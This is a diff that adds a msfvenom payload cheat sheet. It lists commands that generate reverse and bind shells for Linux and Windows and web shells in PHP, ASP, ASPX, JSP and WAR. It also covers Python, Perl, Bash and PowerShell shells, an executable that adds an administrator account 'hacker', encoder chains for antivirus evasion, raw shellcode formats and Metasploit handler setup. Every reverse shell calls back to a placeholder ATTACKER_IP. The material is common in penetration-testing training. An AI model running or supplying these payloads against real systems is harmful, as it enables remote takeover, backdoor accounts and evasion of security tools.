@@ -1,0 +1,154 @@
+# Msfvenom Payload Generation
+
+# ============================================
+# LINUX PAYLOADS
+# ============================================
+
+# Linux staged reverse shell (requires handler)
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > shell.elf
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > shell.elf
+
+# Linux stageless reverse shell (standalone)
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > shell.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > shell.elf
+
+# Linux bind shell
+msfvenom -p linux/x86/shell_bind_tcp LPORT=PORT -f elf > bind.elf
+msfvenom -p linux/x64/shell_bind_tcp LPORT=PORT -f elf > bind.elf
+
+# ============================================
+# WINDOWS PAYLOADS
+# ============================================
+
+# Windows staged reverse shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > shell.exe
+
+# Windows stageless reverse shell
+msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > shell.exe
+
+# Windows bind shell
+msfvenom -p windows/shell_bind_tcp LPORT=PORT -f exe > bind.exe
+
+# Windows add user
+msfvenom -p windows/adduser USER=hacker PASS=Password123! -f exe > adduser.exe
+
+# Windows exec command
+msfvenom -p windows/exec CMD="net user hacker Password123! /add && net localgroup Administrators hacker /add" -f exe > addadmin.exe
+
+# ============================================
+# WEB PAYLOADS
+# ============================================
+
+# PHP reverse shell
+msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.php
+
+# PHP meterpreter
+msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.php
+
+# ASP reverse shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f asp > shell.asp
+
+# ASPX reverse shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f aspx > shell.aspx
+
+# JSP reverse shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.jsp
+
+# WAR reverse shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f war > shell.war
+
+# ============================================
+# SCRIPTING PAYLOADS
+# ============================================
+
+# Python reverse shell
+msfvenom -p python/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.py
+
+# Perl reverse shell
+msfvenom -p cmd/unix/reverse_perl LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.pl
+
+# Bash reverse shell
+msfvenom -p cmd/unix/reverse_bash LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.sh
+
+# PowerShell reverse shell
+msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.ps1
+
+# ============================================
+# WITH BAD CHARACTER REMOVAL
+# ============================================
+
+# Remove null bytes
+msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -b '\x00' -f exe > shell.exe
+
+# Remove common bad chars
+msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -b '\x00\x0a\x0d' -f exe > shell.exe
+
+# ============================================
+# WITH ENCODERS
+# ============================================
+
+# Shikata ga nai encoder
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe
+
+# Multiple encoders
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -e x86/shikata_ga_nai -i 3 -e x86/alpha_mixed -i 2 -f exe > multiencoded.exe
+
+# ============================================
+# SHELLCODE FORMATS
+# ============================================
+
+# C shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f c
+
+# Python shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f python
+
+# PowerShell shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f powershell
+
+# Hex shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f hex
+
+# Base64 shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f base64
+
+# ============================================
+# HANDLERS (Metasploit)
+# ============================================
+
+# Multi handler for staged payloads
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST ATTACKER_IP
+set LPORT PORT
+run
+
+# For stageless (shell_reverse_tcp)
+use exploit/multi/handler
+set PAYLOAD windows/shell_reverse_tcp
+set LHOST ATTACKER_IP
+set LPORT PORT
+run
+
+# ============================================
+# USEFUL OPTIONS
+# ============================================
+
+# List payloads
+msfvenom -l payloads | grep windows
+
+# List encoders
+msfvenom -l encoders
+
+# List formats
+msfvenom -l formats
+
+# Help
+msfvenom -h
+msfvenom -p windows/meterpreter/reverse_tcp --list-options
+
+
+
